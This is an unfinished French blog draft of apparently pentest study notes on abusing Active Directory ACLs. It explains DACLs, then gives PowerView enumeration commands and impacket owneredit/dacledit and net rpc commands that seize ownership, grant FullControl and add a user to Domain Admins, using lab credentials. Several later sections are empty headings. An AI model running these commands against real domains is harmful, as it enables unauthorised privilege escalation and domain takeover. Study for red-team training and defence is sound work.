---
title: "Abusing Active Directory ACLs"
date: 2026-03-06T10:00:00+02:00
draft: true
tags: ["pentest", "Active Directory", "PowerView", "reconnaissance", "CRTP", "red team"]
categories: ["Red Team", "pentester"]
summary: ""
showToc: true
tocOpen: true
---
 exploitation des vulnérabilités du contrôle d'accès Windows/Active Directory pour l'élévation des privilèges, la persistance et les mouvements latéraux. Couvre les techniques offensives d'abus des ACL, l'analyse BloodHound et les méthodes de renforcement défensif pour les équipes de sécurité des entreprises.
 Une liste de contrôle d'accès (ACL) est une liste d' entrées de contrôle d'accès (ACE). Chaque ACE d'une ACL identifie un administrateur et spécifie les droits d'accès autorisés, refusés ou audités pour cet administrateur. Le descripteur de sécurité d'un objet sécurisable peut contenir deux types d'ACL : une DACL et une SACL .
 Une liste de contrôle d'accès discrétionnaire (DACL) identifie les personnes autorisées ou non à accéder à un objet sécurisable. Lorsqu'un processus tente d'accéder à un objet sécurisable, le système vérifie les ACE de la DACL de l'objet afin de déterminer s'il doit y accéder.
 `DAC` La méthode traditionnelle de mise en œuvre du contrôle d'accès contrôle l'accès en fonction de l'identité du demandeur et des règles d'accès qui précisent ce que les demandeurs sont autorisés à faire (ou non). Ce contrôle d'accès est discrétionnaire , car une entité peut disposer de droits d'accès lui permettant, de son propre chef, d'autoriser une autre entité à accéder à une ressource ; contrairement à MAC , où l'entité ayant accès à une ressource ne peut pas, de son propre chef, autoriser une autre entité à y accéder. Windows est un exemple de système d'exploitation DAC , qui utilise des listes de contrôle d'accès discrétionnaires ( DACL ).


## Enumeration des ACL 

Passons à l'énumération des listes de contrôle d'accès (ACLs) à l'aide de PowerView et examinons quelques représentations graphiques avec BloodHound.
### Énumération des ACL avec PowerView

Nous pouvons utiliser PowerView pour énumérer les ACL, mais la tâche de fouiller dans tous les résultats sera extrêmement chronophage et probablement imprécise.
Utilisation de Find-InterestingDomainAcl

```
Find-InterestingDomainAcl
```

```powershell
Get-DomainObjectACL pour effectuer notre recherche ciblée

Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

Création d'une liste des utilisateurs du domaine

```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Nous lisons ensuite chaque ligne du fichier à l'aide d'une boucle foreach, et utilisons le cmdlet Get-Acl pour récupérer les informations d'ACL pour chaque utilisateur du domaine en fournissant chaque ligne du fichier ad_users.txt au cmdlet Get-ADUser.

```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

Effectuer une recherche inversée et un mappage vers une valeur GUID

```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```




#  Abus d'AD-DACL : WriteOwner

![writeOwner](/images/20250803200607.png)

une technique puissante permettant aux attaquants de modifier la propriété des objets de l'annuaire.
Plus précisément, en abusant de l'autorisation WriteOwner dans **les listes de contrôle d'accès discrétionnaires (DACL)** , les adversaires peuvent prendre le contrôle d'objets sensibles et élever leurs privilèges au sein du domaine.

1 . [[impacket]] **Outil Linux Impacket – Octroi de la propriété et du contrôle total**
À partir de systèmes de type UNIX, cela peut être fait avec  owneredit.py

```bash
impacket-owneredit  -action write -new-owner '<username>' -target-dn 'CN=Management,CN=Users,DC=domaine,DC=local' '<domain name>'/'<username>':'<password>'
```
Avec l'aide de owneredit, le DACL de cet objet est modifié avec succès,
Accordons à un utilisateur **un contrôle total** sur le groupe Administrateurs du domaine à l'aide de l'outil dacledit d'Impacket.

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal '<username>' -target-dn 'CN=Admins du domaine,CN=Utilisateurs,DC=domaine,DC=local' '<domain name>' / '<username>' : 'password' -dc-ip <Domain_ip>
```

```bash
python3 /opt/impacket-with-dacledit/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
```
Avec l'aide de dacledit, le DACL de cet objet est modifié avec succès, **l'** utilisateur a désormais **un contrôle total** sur le **groupe**

### Ajout d'un membre au groupe
Le testeur peut abuser de cette autorisation en ajoutant l'utilisateur  au groupe Administrateur de domaine et en répertoriant les membres administrateurs de domaine pour garantir que les utilisateurs deviennent administrateurs de domaine.

```
net rpc group addmem "Domain Admins" <username> -U ignite.local/aaru%'Password@1' -S Domain_ip
```

## Abus d'AD-DACL : AddSelf

## Abus d'AD-DACL : WriteDacl

## Utilisation abusive d'AD-DACL : GenericWrite

## Abuser d'AD-DACL : ForceChangePassword

## Abuser d'AD-DACL : AllExtendedRights


https://www.hackingarticles.in/category/dacl-attacks/